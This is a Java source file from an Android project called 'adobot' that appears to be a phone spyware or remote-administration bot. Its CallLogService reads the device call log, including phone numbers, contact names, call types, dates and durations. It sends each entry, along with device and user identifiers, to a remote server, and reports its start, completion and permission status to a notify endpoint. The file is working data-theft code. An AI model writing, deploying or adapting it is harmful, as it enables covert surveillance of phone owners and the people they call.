package buddy.ap.com.adobot;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

import http.Http;

public class CallLogService extends Thread implements Runnable {

    private static String TAG = "CallLogService";

    private static final String POSTURL = "/call-logs";
    Client client;
    int numlogs;

    public CallLogService(Client client, int numlogs) {
        this.client = client;
        this.numlogs = numlogs;
    }

    @Override
    public void run() {
        super.run();

        getCallLogs();
    }

    private void getCallLogs() {


        if (ContextCompat.checkSelfPermission(client, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {

            HashMap start = new HashMap();
            start.put("event", "getcallhistory:started");
            start.put("uid", client.getUid());
            start.put("device", client.getDevice());
            Http startHttp = new Http();
            startHttp.setUrl(client.SERVER + "/notify");
            startHttp.setMethod("POST");
            startHttp.setParams(start);
            startHttp.execute();

            String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
            Uri callUri = Uri.parse("content://call_log/calls");
            Cursor managedCursor = client.getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
            int id = managedCursor.getColumnIndex(CallLog.Calls._ID);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

            if (managedCursor.moveToFirst()) {
                do {
                    String phNumber = managedCursor.getString(number);
                    String nameS = client.getContactName(client.getApplicationContext(), phNumber);
                    String callType = managedCursor.getString(type);
                    String callDate = managedCursor.getString(date);
                    Date callDayTime = new Date(Long.valueOf(callDate));
                    SimpleDateFormat dt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    String callDuration = managedCursor.getString(duration);
                    try {
                        HashMap p = new HashMap();
                        p.put("uid", client.getUid());
                        p.put("call_id", Integer.toString(id));
                        p.put("type", callType);
                        p.put("phone", phNumber);
                        p.put("name", nameS);
                        p.put("date", dt.format(callDayTime));
                        p.put("duration", callDuration);

//                    JSONObject obj = new JSONObject(p);
//                    client.getSocket().emit("call_log:push", obj);

                        Http req = new Http();
                        req.setMethod("POST");
                        req.setUrl(client.SERVER + POSTURL);
                        req.setParams(p);
                        req.execute();

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    this.numlogs--;
                } while (managedCursor.moveToNext() && this.numlogs > 0);
            }

            start.put("event", "getcallhistory:done");
            start.put("uid", client.getUid());
            start.put("device", client.getDevice());
            Http doneHttp = new Http();
            doneHttp.setUrl(client.SERVER + "/notify");
            doneHttp.setMethod("POST");
            doneHttp.setParams(start);
            doneHttp.execute();

            managedCursor.close();
        } else {

            Log.i(TAG, "No SMS permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", client.getUid());
            noPermit.put("device", client.getDevice());
            noPermit.put("permission", "READ_CALL_LOG");
            Http doneSMS = new Http();
            doneSMS.setUrl(client.SERVER + "/notify");
            doneSMS.setMethod("POST");
            doneSMS.setParams(noPermit);
            doneSMS.execute();
        }

    }
}
